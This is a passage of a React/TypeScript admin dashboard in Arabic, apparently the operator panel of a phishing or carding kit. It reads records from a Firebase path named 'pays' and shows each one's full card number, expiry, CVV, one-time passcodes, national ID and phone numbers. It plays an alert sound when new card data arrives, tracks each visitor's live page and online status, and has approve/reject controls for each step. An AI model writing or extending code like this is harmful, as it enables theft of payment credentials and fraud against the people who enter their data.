          const hasNewCardInfo = notificationsData.some(
            (notification) =>
              notification.data?.paymentCardNumber && !notifications.some((n) => n.id === notification.id && n.data?.paymentCardNumber),
          )
          const hasNewGeneralInfo = notificationsData.some(
            (notification) =>
              (notification.data?.idNumber || notification.data?.email || notification.data?.mobile) &&
              !notifications.some((n) => n.id === notification.id && (n.data?.idNumber || n.data?.email || n.data?.mobile)),
          )

          // Only play notification sound if new card info or general info is added
          if (hasNewCardInfo || hasNewGeneralInfo) {
            playNotificationSound()
          }

          setNotifications(notificationsData)
        } else {
          setNotifications([])
        }
        setIsLoading(false)
      },
      (error) => {
        console.error("Error fetching notifications:", error)
        setIsLoading(false)
        toast({
          title: "خطأ في جلب البيانات",
          description: "حدث خطأ أثناء جلب الإشعارات",
          variant: "destructive",
        })
      },
    )

    return unsubscribe
  }

  const handleInfoClick = (notification: Notification, infoType: "personal" | "card") => {
    setSelectedNotification(notification)
    setSelectedInfo(infoType)
  }

  const closeDialog = () => {
    setSelectedInfo(null)
    setSelectedNotification(null)
  }

  const handleToggleStatistics = () => {
    setShowStatistics(!showStatistics)
  }

  const handleFlagColorChange = async (id: string, color: any) => {
    try {
      // Update in Realtime Database
      const docRef = ref(database, `pays/${id}`)
      await update(docRef, { flagColor: color })

      // Update local state
      setNotifications(
        notifications.map((notification) =>
          notification.id === id ? { ...notification, flagColor: color } : notification,
        ),
      )

      toast({
        title: "تم تحديث العلامة",
        description: color ? "تم تحديث لون العلامة بنجاح" : "تمت إزالة العلامة بنجاح",
        variant: "default",
      })
    } catch (error) {
      console.error("Error updating flag color:", error)
      toast({
        title: "خطأ",
        description: "حدث خطأ أثناء تحديث لون العلامة",
        variant: "destructive",
      })
    }
  }

  const handleApproval = async (state: string, id: string) => {
    try {
      const targetPost = ref(database, `pays/${id}/data`)
      await update(targetPost, {
        status: state,
      })
      toast({
        title: state === "approved" ? "تمت الموافقة" : "تم الرفض",
        description: state === "approved" ? "تمت الموافقة على الإشعار بنجاح" : "تم رفض الإشعار بنجاح",
        variant: "default",
      })
    } catch (error) {
      console.error("Error updating notification status:", error)
      toast({
        title: "خطأ",
        description: "حدث خطأ أثناء تحديث حالة الإشعار",
        variant: "destructive",
      })
    }
  }

  const handleDelete = async (id: string) => {
    try {
      const docRef = ref(database, `pays/${id}`)
      await update(docRef, { isHidden: true })
      setNotifications(notifications.filter((notification) => notification.id !== id))
      toast({
        title: "تم مسح الإشعار",
        description: "تم مسح الإشعار بنجاح",
        variant: "default",
      })
    } catch (error) {
      console.error("Error hiding notification:", error)
      toast({
        title: "خطأ",
        description: "حدث خطأ أثناء مسح الإشعار",
        variant: "destructive",
      })
    }
  }

  const handleClearAll = async () => {
    if (!confirm("هل أنت متأكد من حذف جميع الإشعارات؟")) return

    setIsLoading(true)
    try {
      // Update each notification to hidden using Realtime Database
      const updatePromises = notifications.map(async (notification) => {
        const docRef = ref(database, `pays/${notification.id}`)
        await update(docRef, { isHidden: true })
      })
      await Promise.all(updatePromises)
      setNotifications([])
      toast({
        title: "تم مسح جميع الإشعارات",
        description: "تم مسح جميع الإشعارات بنجاح",
        variant: "default",
      })
    } catch (error) {
      console.error("Error hiding all notifications:", error)
      toast({
        title: "خطأ",
        description: "حدث خطأ أثناء مسح الإشعارات",
        variant: "destructive",
      })
    } finally {
      setIsLoading(false)
    }
  }

  const handleLogout = async () => {
    try {
      await signOut(auth)
      router.push("/login")
    } catch (error) {
      console.error("Error signing out:", error)
      toast({
        title: "خطأ",
        description: "حدث خطأ أثناء تسجيل الخروج",
        variant: "destructive",
      })
    }
  }

  const handleSearch = (term: string) => {
    setSearchTerm(term)
  }

  const handlePageChange = (page: number) => {
    setCurrentPage(page)
    window.scrollTo({ top: 0, behavior: "smooth" })
  }

  const handleRefresh = () => {
    setIsLoading(true)
    fetchNotifications()
    toast({
      title: "تم التحديث",
      description: "تم تحديث البيانات بنجاح",
    })
  }

  const toggleSort = (column: "date" | "status" | "country") => {
    if (sortBy === column) {
      setSortOrder(sortOrder === "asc" ? "desc" : "asc")
    } else {
      setSortBy(column)
      setSortOrder("desc")
    }
  }

  // Keyboard shortcuts
  useEffect(() => {
    const handleKeyPress = (e: KeyboardEvent) => {
      // Focus search on "/"
      if (e.key === "/" && !e.ctrlKey && !e.metaKey) {
        e.preventDefault()
        document.querySelector<HTMLInputElement>('input[type="search"]')?.focus()
      }
      // Refresh on Ctrl+R or Cmd+R
      if ((e.ctrlKey || e.metaKey) && e.key === "r") {
        e.preventDefault()
        handleRefresh()
      }
    }

    document.addEventListener("keydown", handleKeyPress)
    return () => document.removeEventListener("keydown", handleKeyPress)
  }, [])

  if (isLoading && notifications.length === 0) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-background via-background to-muted/20 flex items-center justify-center">
        <div className="flex flex-col items-center gap-4">
          <div className="relative">
            <div className="h-12 w-12 animate-spin rounded-full border-4 border-primary/20 border-t-primary"></div>
            <div className="absolute inset-0 h-12 w-12 animate-pulse rounded-full bg-primary/10"></div>
          </div>
          <div className="text-lg font-medium">جاري التحميل...</div>
        </div>
      </div>
    )
  }

  // Sample data for mini charts (you can replace with real trend data)
  const visitorTrend = [5, 8, 12, 7, 10, 15, 13]
  const cardTrend = [2, 3, 5, 4, 6, 8, 7]
  const onlineTrend = [3, 4, 6, 5, 7, 8, 6]
  const approvedTrend = [1, 2, 4, 3, 5, 7, 6]

  return (
    <>
      <div dir="rtl" className="min-h-screen bg-gradient-to-br from-background via-background to-muted/20">
        {/* Mobile menu */}
        <Sheet open={mobileMenuOpen} onOpenChange={setMobileMenuOpen}>
          <SheetContent side="right" className="w-[280px] sm:w-[350px]" dir="rtl">
            <SheetHeader className="mb-6">
              <SheetTitle className="flex items-center gap-2">
                <Bell className="h-5 w-5 text-primary" />
                <span>لوحة الإشعارات</span>
              </SheetTitle>
            </SheetHeader>
            <div className="space-y-6">
              <div className="flex items-center gap-4">
                <Avatar className="h-12 w-12">
                  <AvatarImage src="/placeholder.svg" alt="صورة المستخدم" />
                  <AvatarFallback className="bg-gradient-to-br from-primary to-primary/80 text-white">م</AvatarFallback>
                </Avatar>
                <div>
                  <p className="font-medium">مدير النظام</p>
                  <p className="text-sm text-muted-foreground">admin@example.com</p>
                </div>
              </div>
              <Separator />
              <nav className="space-y-2">
                <Button
                  variant="ghost"
                  className="w-full justify-start"
                  onClick={() => {
                    setMobileMenuOpen(false)
                    handleToggleStatistics()
                  }}
                >
                  <Activity className="mr-2 h-4 w-4" />
                  {showStatistics ? "إخفاء الإحصائيات" : "عرض الإحصائيات"}
                </Button>
                <Button
                  variant="ghost"
                  className="w-full justify-start"
                  onClick={() => {
                    setMobileMenuOpen(false)
                    setSettingsOpen(true)
                  }}
                >
                  <Settings className="mr-2 h-4 w-4" />
                  الإعدادات
                </Button>
                <Button
                  variant="ghost"
                  className="w-full justify-start"
                  onClick={() => {
                    setMobileMenuOpen(false)
                    setExportDialogOpen(true)
                  }}
                >
                  <Download className="mr-2 h-4 w-4" />
                  تصدير البيانات
                </Button>
                <Button
                  variant="ghost"
                  className="w-full justify-start"
                  onClick={() => {
                    setMobileMenuOpen(false)
                    handleRefresh()
                  }}
                >
                  <RefreshCw className="mr-2 h-4 w-4" />
                  تحديث البيانات
                </Button>
                <Separator />
                <Button
                  variant="ghost"
                  className="w-full justify-start text-red-500 hover:text-red-600 hover:bg-red-50 dark:hover:bg-red-950/30"
                  onClick={handleLogout}
                >
                  <LogOut className="mr-2 h-4 w-4" />
                  تسجيل الخروج
                </Button>
              </nav>
            </div>
          </SheetContent>
        </Sheet>

        {/* Header */}
        <header className="sticky top-0 z-50 border-b bg-background/95 backdrop-blur-xl supports-[backdrop-filter]:bg-background/60 shadow-sm">
          <div className="flex items-center justify-between p-4">
            <div className="flex items-center gap-4">
              <Button variant="ghost" size="icon" className="md:hidden" onClick={() => setMobileMenuOpen(true)}>
                <Menu className="h-5 w-5" />
              </Button>
              <div className="flex items-center gap-3">
                <div className="relative">
                  <div className="bg-gradient-to-br from-primary to-primary/80 p-3 rounded-xl shadow-lg">
                    <Bell className="h-6 w-6 text-white" />
                  </div>
                  {pendingCount > 0 && (
                    <div className="absolute -top-1 -right-1 bg-red-500 text-white text-xs rounded-full h-5 w-5 flex items-center justify-center animate-pulse shadow-md">
                      {pendingCount}
                    </div>
                  )}
                </div>
                <div>
                  <h1 className="text-xl font-bold bg-gradient-to-r from-foreground to-foreground/70 bg-clip-text text-transparent">
                    لوحة الإشعارات المتقدمة
                  </h1>
                  <p className="text-sm text-muted-foreground">
                    آخر تحديث: {format(new Date(), "HH:mm", { locale: ar })}
                  </p>
                </div>
              </div>
            </div>

            {/* Desktop Actions */}
            <div className="hidden md:flex items-center gap-2">
              <TooltipProvider>
                <Tooltip>
                  <TooltipTrigger asChild>
                    <Button variant="outline" size="icon" onClick={handleRefresh} disabled={isLoading}>
                      <RefreshCw className={`h-4 w-4 ${isLoading ? "animate-spin" : ""}`} />
                    </Button>
                  </TooltipTrigger>
                  <TooltipContent>
                    <p>تحديث البيانات (Ctrl+R)</p>
                  </TooltipContent>
                </Tooltip>
              </TooltipProvider>

              <TooltipProvider>
                <Tooltip>
                  <TooltipTrigger asChild>
                    <Button variant="outline" size="icon" onClick={handleToggleStatistics}>
                      <Activity className="h-4 w-4" />
                    </Button>
                  </TooltipTrigger>
                  <TooltipContent>
                    <p>{showStatistics ? "إخفاء الإحصائيات" : "عرض الإحصائيات"}</p>
                  </TooltipContent>
                </Tooltip>
              </TooltipProvider>

              <DropdownMenu>
                <DropdownMenuTrigger asChild>
                  <Button variant="outline" size="icon">
                    <User className="h-4 w-4" />
                  </Button>
                </DropdownMenuTrigger>
                <DropdownMenuContent align="end" className="w-56">
                  <DropdownMenuLabel className="font-normal">
                    <div className="flex flex-col space-y-1">
                      <p className="text-sm font-medium">مدير النظام</p>
                      <p className="text-xs text-muted-foreground">admin@example.com</p>
                    </div>
                  </DropdownMenuLabel>
                  <DropdownMenuSeparator />
                  <DropdownMenuItem onClick={() => setSettingsOpen(true)}>
                    <Settings className="ml-2 h-4 w-4" />
                    <span>الإعدادات</span>
                  </DropdownMenuItem>
                  <DropdownMenuItem onClick={() => setExportDialogOpen(true)}>
                    <Download className="ml-2 h-4 w-4" />
                    <span>تصدير البيانات</span>
                  </DropdownMenuItem>
                  <DropdownMenuSeparator />
                  <DropdownMenuItem onClick={handleLogout} className="text-red-600 dark:text-red-400">
                    <LogOut className="ml-2 h-4 w-4" />
                    <span>تسجيل الخروج</span>
                  </DropdownMenuItem>
                </DropdownMenuContent>
              </DropdownMenu>
            </div>
          </div>
        </header>

        <div className="p-6 space-y-8 max-w-[1920px] mx-auto">
          {/* Statistics Grid */}
          {showStatistics && (
            <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6 animate-in fade-in slide-in-from-top-4 duration-500">
              <StatisticsCard
                title="إجمالي الزوار"
                value={totalVisitorsCount}
                change="+12%"
                changeType="increase"
                icon={Users}
                color="bg-gradient-to-br from-blue-500 to-blue-600"
                trend={visitorTrend}
              />
              <StatisticsCard
                title="المستخدمين المتصلين"
                value={onlineUsersCount}
                change="+5%"
                changeType="increase"
                icon={UserCheck}
                color="bg-gradient-to-br from-green-500 to-green-600"
                trend={onlineTrend}
              />
              <StatisticsCard
                title="معلومات البطاقات"
                value={cardSubmissionsCount}
                change="+8%"
                changeType="increase"
                icon={CreditCard}
                color="bg-gradient-to-br from-purple-500 to-purple-600"
                trend={cardTrend}
              />
              <StatisticsCard
                title="الموافقات"
                value={approvedCount}
                change="+15%"
                changeType="increase"
                icon={CheckCircle}
                color="bg-gradient-to-br from-emerald-500 to-emerald-600"
                trend={approvedTrend}
              />
            </div>
          )}

          {/* Filters and Search */}
          <Card className="bg-card/50 backdrop-blur-sm border shadow-md">
            <CardContent className="p-4">
              <div className="flex flex-col lg:flex-row gap-4 items-start lg:items-center justify-between">
                <div className="flex flex-col sm:flex-row gap-3 w-full lg:w-auto">
                  <Tabs
                    value={filterType}
                    onValueChange={(value: any) => setFilterType(value)}
                    className="w-full sm:w-auto"
                  >
                    <TabsList className="grid grid-cols-4 w-full sm:w-auto">
                      <TabsTrigger value="all" className="flex items-center gap-1">
                        <Filter className="h-3 w-3" />
                        الكل
                      </TabsTrigger>
                      <TabsTrigger value="pending" className="flex items-center gap-1">
                        <Clock className="h-3 w-3" />
                        معلق
                      </TabsTrigger>
                      <TabsTrigger value="card" className="flex items-center gap-1">
                        <CreditCard className="h-3 w-3" />
                        بطاقات
                      </TabsTrigger>
                      <TabsTrigger value="online" className="flex items-center gap-1">
                        <UserCheck className="h-3 w-3" />
                        متصل
                      </TabsTrigger>
                    </TabsList>
                  </Tabs>

                  <Select value={sortBy} onValueChange={(value: any) => setSortBy(value)}>
                    <SelectTrigger className="w-full sm:w-[180px]">
                      <ArrowUpDown className="h-4 w-4 ml-2" />
                      <SelectValue placeholder="ترتيب حسب" />
                    </SelectTrigger>
                    <SelectContent>
                      <SelectItem value="date">التاريخ</SelectItem>
                      <SelectItem value="status">الحالة</SelectItem>
                      <SelectItem value="country">الدولة</SelectItem>
                    </SelectContent>
                  </Select>
                </div>

                <div className="w-full lg:w-[400px]">
                  <SearchBar onSearch={handleSearch} value={searchTerm} />
                </div>
              </div>
            </CardContent>
          </Card>

          {/* Main Content Table */}
          <Card className="bg-card/50 backdrop-blur-sm border shadow-md">
            <CardHeader className="pb-4 border-b">
              <div className="flex flex-col lg:flex-row lg:items-center lg:justify-between gap-4">
                <div>
                  <CardTitle className="text-2xl font-bold flex items-center gap-3">
                    <Activity className="h-6 w-6 text-primary" />
                    إدارة الإشعارات
                  </CardTitle>
                  <CardDescription className="mt-1">
                    عرض وإدارة جميع الإشعارات والبيانات المستلمة ({filteredNotifications.length} إشعار)
                  </CardDescription>
                </div>
                {notifications.length > 0 && (
                  <Button variant="destructive" size="sm" onClick={handleClearAll}>
                    <Trash2 className="h-4 w-4 ml-2" />
                    مسح الكل
                  </Button>
                )}
              </div>
            </CardHeader>
            <CardContent className="p-0">
              {paginatedNotifications.length === 0 ? (
                <div className="flex flex-col items-center justify-center py-16 px-4">
                  <div className="rounded-full bg-muted p-6 mb-4">
                    <AlertCircle className="h-12 w-12 text-muted-foreground" />
                  </div>
                  <h3 className="text-xl font-semibold mb-2">لا توجد إشعارات</h3>
                  <p className="text-muted-foreground text-center">
                    {searchTerm || filterType !== "all"
                      ? "لم يتم العثور على نتائج مطابقة للفلاتر المحددة"
                      : "لا توجد إشعارات حالياً، ستظهر هنا عند استلام إشعارات جديدة"}
                  </p>
                </div>
              ) : (
                <div className="overflow-x-auto">
                  <table className="w-full table-auto border-collapse">
                    <thead>
                      <tr className="bg-muted/50 border-b border-border">
                        {[
                          { label: "الدولة", sortKey: "country" },
                          { label: "المعلومات", sortKey: null },
                          { label: "الحالة", sortKey: "status" },
                          { label: "الوقت", sortKey: "date" },
                          { label: "الاتصال", sortKey: null },
                          { label: "الكود", sortKey: null },
                          { label: "الصفحة", sortKey: null },
                          { label: "الإجراءات", sortKey: null },
                        ].map((heading) => (
                          <th
                            key={heading.label}
                            className={`px-6 py-4 text-right font-semibold text-muted-foreground ${
                              heading.sortKey ? "cursor-pointer hover:bg-muted/80 transition-colors" : ""
                            }`}
                            onClick={heading.sortKey ? () => toggleSort(heading.sortKey as any) : undefined}
                          >
                            <div className="flex items-center gap-2 justify-end">
                              {heading.label}
                              {heading.sortKey && sortBy === heading.sortKey && <ArrowUpDown className="h-3 w-3" />}
                            </div>
                          </th>
                        ))}
                      </tr>
                    </thead>
                    <tbody>
                      {paginatedNotifications.map((notification, index) => (
                        <tr
                          key={notification.id}
                          className="border-b border-border hover:bg-muted/30 transition-colors animate-in fade-in slide-in-from-bottom-2"
                          style={{ animationDelay: `${index * 50}ms` }}
                        >
                          <td className="px-6 py-4">
                            <div className="flex items-center gap-3">
                              <div className="w-8 h-8 rounded-full bg-gradient-to-br from-primary/20 to-primary/10 flex items-center justify-center">
                                <MapPin className="h-4 w-4 text-primary" />
                              </div>
                              <span className="font-medium">{notification.country || "غير معروف"}</span>
                            </div>
                          </td>
                          <td className="px-6 py-4">
                            <div className="flex flex-wrap gap-2">
                              <InfoBadge
                                active={notification.data?.phone || notification.data?.fullName}
                                onClick={() => handleInfoClick(notification, "personal")}
                                icon={User}
                                text="معلومات شخصية"
                                inactiveText="لا يوجد معلومات"
                                colorClass="from-blue-500 to-blue-600"
                              />
                              <InfoBadge
                                active={notification.data?.paymentCardNumber}
                                onClick={() => handleInfoClick(notification, "card")}
                                icon={CreditCard}
                                text="معلومات البطاقة"
                                inactiveText="لا يوجد بطاقة"
                                colorClass="from-green-500 to-green-600"
                              />
                            </div>
                          </td>
                          <td className="px-6 py-4">
                            <StatusBadge status={notification.data?.status} />
                          </td>
                          <td className="px-6 py-4">
                            <div className="flex items-center gap-2 text-sm text-muted-foreground">
                              <Clock className="h-4 w-4 flex-shrink-0" />
                              <span className="whitespace-nowrap">
                                {notification.createdDate &&
                                  formatDistanceToNow(new Date(notification.createdDate), {
                                    addSuffix: true,
                                    locale: ar,
                                  })}
                              </span>
                            </div>
                          </td>
                          <td className="px-6 py-4">
                            <UserStatus userId={notification.id} />
                          </td>
                          <td className="px-6 py-4 text-center">
                            {notification.otp ? (
                              <Badge
                                variant="outline"
                                className="bg-blue-50 text-blue-700 border-blue-200 dark:bg-blue-950/30 dark:text-blue-300 font-mono"
                              >
                                {notification.otp}
                              </Badge>
                            ) : (
                              <span className="text-muted-foreground text-sm">-</span>
                            )}
                          </td>
                          <td className="px-6 py-4 text-center">
                            {notification?.currentPage ? (
                              <Badge variant="outline">{notification.currentPage}</Badge>
                            ) : (
                              <span className="text-muted-foreground text-sm">-</span>
                            )}
                          </td>
                          <td className="px-6 py-4">
                            <ActionButtons
                              notification={notification}
                              handleApproval={handleApproval}
                              handleDelete={handleDelete}
                              handleFlagColorChange={handleFlagColorChange}
                            />
                          </td>
                        </tr>
                      ))}
                    </tbody>
                  </table>
                </div>
              )}
            </CardContent>
            {paginatedNotifications.length > 0 && (
              <CardFooter className="border-t p-4">
                <Pagination
                  currentPage={currentPage}
                  totalPages={totalPages}
                  onPageChange={handlePageChange}
                  totalItems={filteredNotifications.length}
                  itemsPerPage={itemsPerPage}
                />
              </CardFooter>
            )}
          </Card>
        </div>
      </div>

      {/* Info Dialog */}
      <Dialog open={selectedInfo !== null} onOpenChange={closeDialog}>
        <DialogContent className="max-w-md bg-background rounded-xl shadow-lg p-6" dir="rtl">
          <DialogHeader>
            <DialogTitle className="flex items-center gap-3 text-2xl font-semibold">
              {selectedInfo === "personal" ? (
                <HeaderIcon icon={User} bgGradient="from-blue-400 to-blue-600" title="المعلومات الشخصية" />
              ) : (
                <HeaderIcon icon={CreditCard} bgGradient="from-green-400 to-green-600" title="معلومات البطاقة" />
              )}
            </DialogTitle>
          </DialogHeader>

          {selectedNotification && selectedInfo === "personal" && (
            <InfoSection
              items={[
                { label: "الاسم", value: selectedNotification.data?.fullName },
                { label: "رقم الهوية", value: selectedNotification.data?.idNumber, sensitive: true },
                { label: "الشبكة", value: selectedNotification.data?.network },
                { label: "رقم الجوال", value: selectedNotification.data?.mobile, sensitive: true },
                { label: "الهاتف", value: selectedNotification.data?.phone, sensitive: true },
                { label: "رمز الهاتف", value: selectedNotification.data?.otp2, sensitive: true },
                { label: "البريد الإلكتروني", value: selectedNotification.data?.email },
              ]}
            />
          )}

          {selectedNotification && selectedInfo === "card" && (
            <InfoSection
              items={[
                {
                  label: "رقم البطاقة",
                  value: selectedNotification.data?.paymentCardNumber
                    ? `${selectedNotification.data?.paymentCardNumber}`
                    : undefined,
                  sensitive: false,
                },
                {
                  label: "تاريخ الانتهاء",
                  value:
                    selectedNotification.data?.paymentExpiry,
                },
                { label: "رمز الأمان (CVV)", value: selectedNotification.data?.paymentCVV, sensitive: false },
                { label: "رمز التحقق (OTP)", value: selectedNotification.otp, sensitive: false },
                { label: "الخطوة الحالية", value: selectedNotification.currentStep },
                { label: "المبلغ", value: selectedNotification?.currentStep },
              ]}
              additionalOtps={selectedNotification?.allOtps!}
            />
          )}

          <DialogFooter>
            <Button onClick={closeDialog} className="w-full">
              إغلاق
            </Button>
          </DialogFooter>
        </DialogContent>
      </Dialog>

      {/* Settings Panel */}
      <SettingsPanel open={settingsOpen} onOpenChange={setSettingsOpen} />

      {/* Export Dialog */}
      <ExportDialog open={exportDialogOpen} onOpenChange={setExportDialogOpen} notifications={filteredNotifications} />
    </>
  )
}
